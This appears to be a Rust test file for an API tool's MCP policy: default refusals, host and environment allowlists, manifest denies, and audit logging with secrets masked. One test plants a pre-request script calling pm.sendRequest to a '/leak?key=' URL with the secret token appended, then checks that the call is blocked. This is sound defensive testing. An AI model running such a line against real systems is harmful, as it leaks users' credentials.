//! The MCP policy on the engine tools (user-config-mcp-policy S3-S8), on temp workspaces with
//! a temp config file, a temp audit log, a temp app state and an in-memory secret store.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::indexing_slicing,
    clippy::panic
)]

mod common;

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use reqflux_engine::MemorySecretStore;
use reqflux_mcp::engine_tools::{
    self, CollectionCreateArgs, EngineState, EnvironmentCreateArgs, ExecuteArgs, ItemArgs,
    PolicyPaths, RequestCreateArgs, ScopeArgs, VariableSetArgs, WorkspaceCreateArgs,
};
use reqflux_mcp::tools::ToolError;
use serde_json::Value;
use tempfile::TempDir;
use wiremock::matchers::method;
use wiremock::{Mock, MockServer, ResponseTemplate};

const SECRET: &str = "sk-live-0123456789";
const PLAIN: &str = "plain-value-4242";

fn json(text: &str) -> Value {
    serde_json::from_str(text).unwrap_or_else(|error| panic!("not JSON ({error}): {text}"))
}

fn ok(result: Result<String, ToolError>) -> Value {
    match result {
        Ok(text) => json(&text),
        Err(error) => panic!("tool failed: {error}"),
    }
}

fn err(result: Result<String, ToolError>) -> String {
    match result {
        Ok(text) => panic!("expected a refusal, got {text}"),
        Err(error) => error.to_string(),
    }
}

fn id_of(value: &Value) -> String {
    value["id"].as_str().expect("an id").to_owned()
}

/// Every file under `root` with its contents, to prove a refused call changed nothing.
fn snapshot(root: &Path) -> BTreeMap<PathBuf, Vec<u8>> {
    let mut files = BTreeMap::new();
    let mut pending = vec![root.to_path_buf()];
    while let Some(dir) = pending.pop() {
        for entry in std::fs::read_dir(&dir).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                pending.push(path);
            } else {
                files.insert(path.clone(), std::fs::read(&path).unwrap());
            }
        }
    }
    files
}

fn audit_lines(paths: &PolicyPaths) -> Vec<Value> {
    reqflux_engine::audit::read(&paths.audit).unwrap()
}

fn audit_text(paths: &PolicyPaths) -> String {
    std::fs::read_to_string(&paths.audit).unwrap_or_default()
}

/// A workspace `Demo` with a collection, a request to `url` and a secret global `token`
/// and a plain global `plain`, built under an allow-all config, which is then replaced by
/// `config` (no file when `None`) and the audit log cleared.
struct Fixture {
    _dir: TempDir,
    state: EngineState,
    paths: PolicyPaths,
    root: PathBuf,
    workspace_id: String,
    collection: String,
    request: String,
}

fn fixture(url: &str, config: Option<&str>) -> Fixture {
    let dir = TempDir::new().unwrap();
    let paths = common::allow_all(dir.path());
    let mut state = EngineState::new(
        Arc::new(MemorySecretStore::new()),
        Some(dir.path().join("state/reqflux/state.sqlite3")),
        paths.clone(),
    );
    let root = dir.path().join("ws");
    let created = ok(engine_tools::workspace_create(
        &mut state,
        WorkspaceCreateArgs {
            path: root.display().to_string(),
            name: "Demo".to_owned(),
        },
    ));
    let workspace_id = id_of(&created);
    let collection = id_of(&ok(engine_tools::collection_create(
        &mut state,
        CollectionCreateArgs {
            name: Some("API".to_owned()),
        },
    )));
    let request = id_of(&ok(engine_tools::request_create(
        &mut state,
        RequestCreateArgs {
            parent_id: collection.clone(),
            name: Some("Ping".to_owned()),
            method: Some("GET".to_owned()),
            url: Some(url.to_owned()),
        },
    )));
    for (key, value, secret) in [("token", SECRET, true), ("plain", PLAIN, false)] {
        ok(engine_tools::variable_set(
            &mut state,
            VariableSetArgs {
                scope: "global".to_owned(),
                key: key.to_owned(),
                value: Some(value.to_owned()),
                secret: Some(secret),
                enabled: None,
                description: None,
            },
        ));
    }
    for name in ["dev", "prod"] {
        ok(engine_tools::environment_create(
            &mut state,
            EnvironmentCreateArgs {
                name: Some(name.to_owned()),
            },
        ));
    }
    match config {
        Some(text) => common::write_config(&paths, text),
        None => std::fs::remove_file(&paths.config).unwrap(),
    }
    std::fs::remove_file(&paths.audit).unwrap();
    Fixture {
        _dir: dir,
        state,
        paths,
        root,
        workspace_id,
        collection,
        request,
    }
}

fn execute(fixture: &mut Fixture, environment: Option<&str>) -> Result<String, ToolError> {
    engine_tools::request_execute(
        &mut fixture.state,
        ExecuteArgs {
            id: fixture.request.clone(),
            environment: environment.map(str::to_owned),
            vars: None,
        },
    )
}

fn create_collection(fixture: &mut Fixture) -> Result<String, ToolError> {
    engine_tools::collection_create(
        &mut fixture.state,
        CollectionCreateArgs {
            name: Some("Agent".to_owned()),
        },
    )
}

async fn mock_server() -> MockServer {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_string("pong"))
        .mount(&server)
        .await;
    server
}

/// The S6 refusal of `tool` of `class` under the defaults, naming the config file used.
fn ask_refusal(tool: &str, article: &str, class: &str, paths: &PolicyPaths) -> String {
    format!(
        "{tool} is {article} {class} tool and {class} is \"ask\" in {} ([mcp] {class}); in-app \
         approvals do not exist yet, so ask refuses",
        paths.config.display()
    )
}

#[tokio::test(flavor = "multi_thread")]
async fn the_defaults_refuse_writes_and_execution_and_audit_both() {
    let server = mock_server().await;
    let url = format!("{}/ping", server.uri());
    let mut fixture = tokio::task::block_in_place(|| fixture(&url, None));
    let before = snapshot(&fixture.root);

    let refused = err(tokio::task::block_in_place(|| {
        create_collection(&mut fixture)
    }));
    assert_eq!(
        refused,
        ask_refusal("collection_create", "a", "write", &fixture.paths)
    );
    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    assert_eq!(
        refused,
        ask_refusal("request_execute", "an", "execute", &fixture.paths)
    );
    let refused = err(engine_tools::item_delete(
        &mut fixture.state,
        ItemArgs {
            id: fixture.request.clone(),
        },
    ));
    assert_eq!(
        refused,
        ask_refusal("item_delete", "a", "destructive", &fixture.paths)
    );

    assert_eq!(snapshot(&fixture.root), before, "nothing changed on disk");
    assert!(server.received_requests().await.unwrap().is_empty());
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 3, "{lines:?}");
    for (line, tool, class) in [
        (&lines[0], "collection_create", "write"),
        (&lines[1], "request_execute", "execute"),
        (&lines[2], "item_delete", "destructive"),
    ] {
        assert_eq!(line["tool"], tool);
        assert_eq!(line["class"], class);
        assert_eq!(line["decision"], "refused");
        assert_eq!(line["workspace_id"], fixture.workspace_id.as_str());
        assert!(line["reason"].as_str().unwrap().contains("ask refuses"));
        assert!(line["time"].as_str().unwrap().ends_with('Z'));
    }
    assert_eq!(lines[1]["targets"][0], fixture.request.as_str());
    assert!(lines[1].get("url").is_none(), "refused before preparing");
}

#[test]
fn read_tools_run_under_the_defaults_and_are_not_audited() {
    let mut fixture = fixture("http://127.0.0.1:9/x", None);
    ok(engine_tools::workspace_info(&mut fixture.state));
    ok(engine_tools::request_get(
        &mut fixture.state,
        ItemArgs {
            id: fixture.request.clone(),
        },
    ));
    ok(engine_tools::environment_list(&mut fixture.state));
    ok(engine_tools::variables_get(
        &mut fixture.state,
        ScopeArgs {
            scope: format!("collection:{}", fixture.collection),
        },
    ));
    assert!(
        !fixture.paths.audit.exists(),
        "{}",
        audit_text(&fixture.paths)
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn allowed_calls_run_and_are_audited_with_the_masked_url_and_no_values() {
    let server = mock_server().await;
    let url = format!("{}/ping?key={{{{token}}}}&p={{{{plain}}}}", server.uri());
    let mut fixture = tokio::task::block_in_place(|| fixture(&url, None));
    common::write_config(
        &fixture.paths,
        "[mcp]\nwrite = \"allow\"\nexecute = \"allow\"\n",
    );

    let created = ok(tokio::task::block_in_place(|| {
        create_collection(&mut fixture)
    }));
    let output = ok(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    assert_eq!(output["status"], 200);
    assert_eq!(server.received_requests().await.unwrap().len(), 1);

    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 2, "{lines:?}");
    assert_eq!(lines[0]["tool"], "collection_create");
    assert_eq!(lines[0]["decision"], "allowed");
    assert!(lines[0].get("reason").is_none());
    assert_eq!(lines[1]["tool"], "request_execute");
    assert_eq!(lines[1]["decision"], "allowed");
    assert_eq!(lines[1]["method"], "GET");
    let audited = lines[1]["url"].as_str().unwrap();
    assert!(
        audited.starts_with(&format!("{}/ping?key=", server.uri())),
        "{audited}"
    );
    assert!(audited.contains(reqflux_engine::MASK), "{audited}");
    let text = audit_text(&fixture.paths);
    assert!(!text.contains(SECRET), "{text}");
    assert!(!text.contains("Agent"), "argument values stay out: {text}");
    assert_ne!(id_of(&created), fixture.collection);
}

#[test]
fn a_variable_value_never_reaches_the_audit_log() {
    let mut fixture = fixture("http://127.0.0.1:9/x", Some(common::ALLOW_ALL));
    ok(engine_tools::variable_set(
        &mut fixture.state,
        VariableSetArgs {
            scope: format!("collection:{}", fixture.collection),
            key: "k".to_owned(),
            value: Some(PLAIN.to_owned()),
            secret: Some(false),
            enabled: None,
            description: Some("a description".to_owned()),
        },
    ));
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0]["targets"][0], fixture.collection.as_str());
    let text = audit_text(&fixture.paths);
    assert!(
        !text.contains(PLAIN) && !text.contains("a description"),
        "{text}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_outside_hosts_is_refused_before_sending() {
    let server = mock_server().await;
    let url = format!("{}/ping?key={{{{token}}}}", server.uri());
    let mut fixture = tokio::task::block_in_place(|| fixture(&url, None));
    common::write_config(
        &fixture.paths,
        "[mcp]\nexecute = \"allow\"\nhosts = [\"api.example.com\", \"*.127.0.0.1\"]\n",
    );

    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    let address = server.address();
    assert_eq!(
        refused,
        format!(
            "request_execute may not reach 127.0.0.1:{}: it is not in hosts = \
             [\"api.example.com\", \"*.127.0.0.1\"] in {} ([mcp] hosts)",
            address.port(),
            fixture.paths.config.display()
        )
    );
    assert!(server.received_requests().await.unwrap().is_empty());
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0]["decision"], "refused");
    assert_eq!(lines[0]["method"], "GET");
    assert!(
        lines[0]["url"]
            .as_str()
            .unwrap()
            .contains(reqflux_engine::MASK)
    );
    assert!(!audit_text(&fixture.paths).contains(SECRET));

    // The same host allowed with its port runs.
    common::write_config(
        &fixture.paths,
        &format!(
            "[mcp]\nexecute = \"allow\"\nhosts = [\"127.0.0.1:{}\"]\n",
            address.port()
        ),
    );
    ok(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    assert_eq!(server.received_requests().await.unwrap().len(), 1);
}

#[test]
fn an_environment_outside_environments_is_refused() {
    let mut fixture = fixture(
        "http://127.0.0.1:9/x",
        Some("[mcp]\nexecute = \"allow\"\nenvironments = [\"dev\"]\n"),
    );
    let refused = err(execute(&mut fixture, Some("prod")));
    assert_eq!(
        refused,
        format!(
            "request_execute may not use the environment prod: it is not in environments = \
             [\"dev\"] in {} ([mcp] environments)",
            fixture.paths.config.display()
        )
    );
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0]["decision"], "refused");
    // An allowed environment gets past the policy: the closed port fails the send.
    let failed = err(execute(&mut fixture, Some("dev")));
    assert!(!failed.contains("may not"), "{failed}");
    assert_eq!(audit_lines(&fixture.paths)[1]["decision"], "allowed");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_manifest_deny_refuses_even_when_the_user_allows() {
    let server = mock_server().await;
    let url = format!("{}/ping", server.uri());
    let mut fixture = tokio::task::block_in_place(|| fixture(&url, Some(common::ALLOW_ALL)));
    let manifest = fixture.root.join("reqflux.toml");
    let mut text = std::fs::read_to_string(&manifest).unwrap();
    text.push_str("\n[mcp]\nexecute = \"deny\"\nwrite = \"allow\"\n");
    std::fs::write(&manifest, text).unwrap();

    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    assert_eq!(
        refused,
        format!(
            "request_execute is an execute tool and execute is \"deny\" in {} ([mcp] execute)",
            manifest.display()
        )
    );
    assert!(server.received_requests().await.unwrap().is_empty());
    assert_eq!(audit_lines(&fixture.paths)[0]["decision"], "refused");
}

#[test]
fn a_workspace_override_in_the_config_restricts() {
    let mut fixture = fixture("http://127.0.0.1:9/x", Some(common::ALLOW_ALL));
    let text = format!(
        "{}[mcp.workspaces.\"{}\"]\nwrite = \"deny\"\n",
        common::ALLOW_ALL,
        fixture.workspace_id
    );
    common::write_config(&fixture.paths, &text);
    let refused = err(create_collection(&mut fixture));
    assert!(
        refused.ends_with(&format!(
            "([mcp.workspaces.\"{}\"] write)",
            fixture.workspace_id
        )),
        "{refused}"
    );
}

#[test]
fn an_audit_log_that_cannot_be_written_refuses_the_call() {
    let mut fixture = fixture("http://127.0.0.1:9/x", Some(common::ALLOW_ALL));
    // A file where the audit log's directory should be.
    let blocked = fixture.paths.audit.parent().unwrap().to_path_buf();
    std::fs::remove_dir_all(&blocked).unwrap();
    std::fs::write(&blocked, "not a directory").unwrap();
    let before = snapshot(&fixture.root);

    let refused = err(create_collection(&mut fixture));
    assert!(
        refused.starts_with(
            "collection_create was refused because its audit line could not be written"
        ),
        "{refused}"
    );
    let refused = err(execute(&mut fixture, None));
    assert!(
        refused
            .starts_with("request_execute was refused because its audit line could not be written"),
        "{refused}"
    );
    assert_eq!(snapshot(&fixture.root), before);
}

#[test]
fn a_config_that_does_not_parse_runs_on_the_defaults_and_says_so() {
    let mut fixture = fixture("http://127.0.0.1:9/x", Some("[mcp]\nwrite = \"yes\"\n"));
    let refused = err(create_collection(&mut fixture));
    assert!(
        refused.starts_with(&ask_refusal(
            "collection_create",
            "a",
            "write",
            &fixture.paths
        )),
        "{refused}"
    );
    assert!(
        refused.contains("the config file failed to load, so the defaults apply"),
        "{refused}"
    );
    assert!(refused.contains("line 2, column"), "{refused}");
    assert!(
        !refused.contains("\"yes\""),
        "the source is not quoted: {refused}"
    );
    ok(engine_tools::workspace_info(&mut fixture.state));
}

#[test]
fn an_edit_to_the_config_applies_on_the_next_call() {
    let mut fixture = fixture("http://127.0.0.1:9/x", None);
    err(create_collection(&mut fixture));
    common::write_config(&fixture.paths, "[mcp]\nwrite = \"allow\"\n");
    ok(create_collection(&mut fixture));
}

#[test]
fn startup_opens_the_most_recent_workspace_that_loads() {
    let dir = TempDir::new().unwrap();
    let broken = dir.path().join("broken");
    std::fs::create_dir_all(&broken).unwrap();
    std::fs::write(broken.join("reqflux.toml"), "not toml [").unwrap();
    let newer = dir.path().join("newer");
    let older = dir.path().join("older");
    reqflux_engine::create_workspace(&newer, "Newer").unwrap();
    reqflux_engine::create_workspace(&older, "Older").unwrap();
    let cwd = dir.path().join("elsewhere");
    std::fs::create_dir_all(&cwd).unwrap();
    let recents = [dir.path().join("gone"), broken, newer, older.clone()];

    let state = |dir: &TempDir| {
        EngineState::new(
            Arc::new(MemorySecretStore::new()),
            Some(dir.path().join("state.sqlite3")),
            common::paths(dir.path(), None),
        )
    };
    let mut started = state(&dir);
    started.open_startup(None, &cwd, &recents).unwrap();
    assert_eq!(
        ok(engine_tools::workspace_info(&mut started))["name"],
        "Newer"
    );

    // A workspace in the current directory still wins over the recents.
    let mut in_cwd = state(&dir);
    in_cwd.open_startup(None, &older, &recents[2..3]).unwrap();
    assert_eq!(
        ok(engine_tools::workspace_info(&mut in_cwd))["name"],
        "Older"
    );
}

/// The `.req.toml` file of the fixture's request.
fn request_file(fixture: &Fixture) -> PathBuf {
    snapshot(&fixture.root)
        .into_keys()
        .find(|path| path.to_string_lossy().ends_with(".req.toml"))
        .unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_pre_request_send_outside_hosts_is_refused_and_audited() {
    let server = mock_server().await;
    let mut fixture = tokio::task::block_in_place(|| {
        fixture("https://api.example.com/ping", Some(common::ALLOW_ALL))
    });
    common::write_config(
        &fixture.paths,
        "[mcp]\nexecute = \"allow\"\nhosts = [\"api.example.com\"]\n",
    );
    let script = request_file(&fixture)
        .with_extension("")
        .with_extension("pre.js");
    std::fs::write(
        &script,
        format!(
            "pm.sendRequest(\"{}/leak?key=\" + pm.variables.get(\"token\"), function () {{}});\n",
            server.uri()
        ),
    )
    .unwrap();

    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    let port = server.address().port();
    let expected = format!(
        "request_execute may not reach 127.0.0.1:{port}: it is not in hosts = \
         [\"api.example.com\"] in {} ([mcp] hosts)",
        fixture.paths.config.display()
    );
    assert_eq!(
        refused,
        format!("a script's pm.sendRequest was refused: {expected}")
    );
    assert!(server.received_requests().await.unwrap().is_empty());
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 1, "{lines:?}");
    assert_eq!(lines[0]["decision"], "refused");
    assert_eq!(lines[0]["reason"], refused.as_str());
    assert_eq!(lines[0]["method"], "GET");
    assert_eq!(
        lines[0]["url"],
        format!("{}/leak?key={}", server.uri(), reqflux_engine::MASK).as_str()
    );
    assert!(!audit_text(&fixture.paths).contains(SECRET));
}

#[test]
fn a_write_tool_rechecks_a_manifest_deny_added_after_loading() {
    let mut fixture = fixture("http://127.0.0.1:9/x", Some(common::ALLOW_ALL));
    let manifest = fixture.root.join("reqflux.toml");
    let mut text = std::fs::read_to_string(&manifest).unwrap();
    text.push_str("\n[mcp]\nwrite = \"deny\"\n");
    std::fs::write(&manifest, text).unwrap();
    let before = snapshot(&fixture.root);

    let refused = err(create_collection(&mut fixture));
    assert_eq!(
        refused,
        format!(
            "collection_create is a write tool and write is \"deny\" in {} ([mcp] write)",
            manifest.display()
        )
    );
    assert_eq!(snapshot(&fixture.root), before, "nothing was written");
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0]["decision"], "refused");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_redirect_outside_hosts_is_refused_and_audited() {
    let landing = mock_server().await;
    let target = format!("{}/landing", landing.uri());
    let start = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(302).insert_header("Location", target.as_str()))
        .mount(&start)
        .await;
    let url = format!("{}/start", start.uri());
    let mut fixture = tokio::task::block_in_place(|| fixture(&url, Some(common::ALLOW_ALL)));
    let port = start.address().port();
    common::write_config(
        &fixture.paths,
        &format!("[mcp]\nexecute = \"allow\"\nhosts = [\"127.0.0.1:{port}\"]\n"),
    );

    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
    let reason = format!(
        "request_execute may not reach 127.0.0.1:{}: it is not in hosts = \
         [\"127.0.0.1:{port}\"] in {} ([mcp] hosts)",
        landing.address().port(),
        fixture.paths.config.display()
    );
    let expected = format!("a redirect to {target} was refused: {reason}");
    assert_eq!(refused, expected);
    assert!(landing.received_requests().await.unwrap().is_empty());
    assert_eq!(start.received_requests().await.unwrap().len(), 1);
    let lines = audit_lines(&fixture.paths);
    assert_eq!(lines.len(), 2, "{lines:?}");
    assert_eq!(lines[0]["decision"], "allowed");
    assert_eq!(lines[1]["decision"], "refused");
    assert_eq!(lines[1]["reason"], expected.as_str());
    assert_eq!(lines[1]["method"], "GET");
    assert_eq!(lines[1]["url"], target.as_str());
}
